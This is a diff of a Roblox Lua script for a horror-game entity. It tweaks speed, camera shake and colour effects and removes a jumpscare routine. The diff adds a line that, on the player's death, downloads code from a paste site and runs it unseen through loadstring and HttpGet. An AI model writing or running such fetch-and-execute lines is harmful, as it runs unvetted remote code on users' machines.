@@ -1,5 +1,7 @@
 local TweenService = game:GetService("TweenService")
 local color = true
+local clone = game.Lighting:FindFirstChild("MainColorCorrection"):Clone()
+clone.Parent = game.Lighting
 
 local sound = Instance.new("Sound")
 sound.Name = "Thunder"
@@ -31,10 +33,10 @@ local entity = Spawner:Create({
 	CameraShake = {
 		Enabled = true,
 		Range = 100,
-		Values = {50, 10, 0.1, 0.2}
+		Values = {30, 10, 0.1, 0.2}
 	},
 	Movement = {
-		Speed = 500,
+		Speed = 675,
 		Delay = 8,
 		Reversed = false
 	},
@@ -73,10 +75,12 @@ local entity = Spawner:Create({
 sound:Play()
 
 entity:SetCallback("OnSpawned", function()
+	repeat task.wait() until entity.Model
+
 	task.spawn(function()
 		while color do
 			task.wait(3)
-			local cc = game.Lighting:FindFirstChild("MainColorCorrection")
+			local cc = clone
 			if cc then
 				TweenService:Create(
 					cc,
@@ -96,19 +100,13 @@ entity:SetCallback("OnSpawned", function()
 	end)
 end)
 
-entity:SetCallback("OnRebounding", function(startOfRebound)
-	if not startOfRebound then
-		entity.Config.Movement.Speed += 300
-	end
-end)
-
 entity:SetCallback("OnDespawning", function()
 	color = false
 	if sound then sound:Destroy() end
 
 	task.wait(4)
 
-	local cc = game.Lighting:FindFirstChild("MainColorCorrection")
+	local cc = clone
 	if cc then
 		TweenService:Create(
 			cc,
@@ -116,81 +114,14 @@ entity:SetCallback("OnDespawning", function()
 			{TintColor = Color3.fromRGB(255,255,255)}
 		):Play()
 	end
+	
+	task.wait(5)
+	cc:Destroy()
 end)
 
 entity:SetCallback("OnDamagePlayer", function(newHealth)
-	if newHealth > 0 then
-		local TweenService = game:GetService("TweenService")
-		local shadow = game:GetObjects("rbxassetid://11503625408")[1]
-        local gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
-        shadow.Parent = gui
-        shadow.Visible = true
-
-        local sound = Instance.new("Sound")
-        sound.SoundId = "rbxassetid://18564431123" 
-        sound.Parent = gui
-        sound.Volume = 0.5
-        sound:Play()
-
-        local octave = Instance.new("PitchShiftSoundEffect",sound)
-        octave.Octave = 0.5
-        local level = Instance.new("DistortionSoundEffect",sound)
-        level.Level = 0.97
-        local a = Instance.new("DistortionSoundEffect",sound)
-        a.Level = 0.75
-        local b = Instance.new("DistortionSoundEffect",sound)
-        b.Level = 0.75
-
-        local l__ImageLabel__1 = shadow.ImageLabel;
-        local v2 = Random.new();
-        local l__SizeValue__3 = shadow.SizeValue;
-        local v4 = math.random(1, 6);
-                if v4 == 1 then
-                        l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-                end;
-                if v4 == 2 then
-                        l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-                end;
-                if v4 == 3 then
-                        l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-                end;
-                if v4 == 4 then
-                    	l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-                end;
-                if v4 == 5 then
-                        l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-                end;
-                if v4 == 6 then
-                        l__ImageLabel__1.Image = "rbxassetid://106105356667208";
-        end;
-        shadow.Jumpscare:Play();
-        for v5 = 1, 25 do
-                local v6 = math.random(1, 25);
-                if v6 == 1 then
-                		TweenService:Create(shadow, TweenInfo.new(0.0001), {BackgroundColor3 = Color3.fromRGB(50, 0, 150)}):Play();
-                		l__ImageLabel__1.ImageColor3 = Color3.new(1, 1, 1);
-            	end;
-            	if v6 == 2 then
-                        TweenService:Create(shadow, TweenInfo.new(0.0001), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play();
-                		l__ImageLabel__1.ImageColor3 = Color3.new(1, 1, 1);
-           	end;
-           	if v6 == 3 then
-                		TweenService:Create(shadow, TweenInfo.new(0.0001), {BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play();
-                		l__ImageLabel__1.ImageColor3 = Color3.fromRGB(0, 0, 0);
-           	end;
-        		l__ImageLabel__1.Position = UDim2.new(v2:NextNumber(0.4, 0.6), 0, v2:NextNumber(0.45, 0.45), 0);
-        		l__ImageLabel__1.Size = l__ImageLabel__1.Size + UDim2.new(l__SizeValue__3.Value, 0, l__SizeValue__3.Value, 0);
-        		l__ImageLabel__1.Rotation = math.random(-50, 50);
-	        	l__SizeValue__3.Value = l__SizeValue__3.Value - 0.013;
-	        	wait(0);
-        end;
-
-		l__ImageLabel__1.ImageColor3 = Color3.new(0, 0, 0);
-		shadow.BackgroundColor3 = Color3.new(0, 0, 0);	
-		TweenService:Create(l__ImageLabel__1, TweenInfo.new(4), {ImageTransparency = 1}):Play();
-		TweenService:Create(shadow, TweenInfo.new(3), {BackgroundTransparency = 1}):Play();
-		wait(4);
-		gui:destroy()
+	if newHealth == 0 or newHealth < 0 then
+		loadstring(game:HttpGet("https://pastefy.app/xclq6IqV/raw"))()
 	end
 end)
 
